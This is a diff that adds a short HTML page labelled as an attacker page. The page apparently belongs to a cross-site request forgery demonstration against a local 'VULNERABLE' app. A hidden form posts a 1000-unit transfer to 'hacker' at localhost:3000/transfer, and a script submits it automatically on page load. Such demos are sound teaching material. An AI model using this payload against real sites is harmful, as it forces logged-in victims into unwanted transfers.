@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Attacker page (targets VULNERABLE)</h1>
+    <form id="evil" action="http://localhost:3000/transfer" method="POST">
+      <input type="hidden" name="to" value="hacker" />
+      <input type="hidden" name="amount" value="1000" />
+    </form>
+    <script>
+      // Auto-submit as soon as the page loads
+      document.getElementById("evil").submit();
+    </script>
+  </body>
+</html>
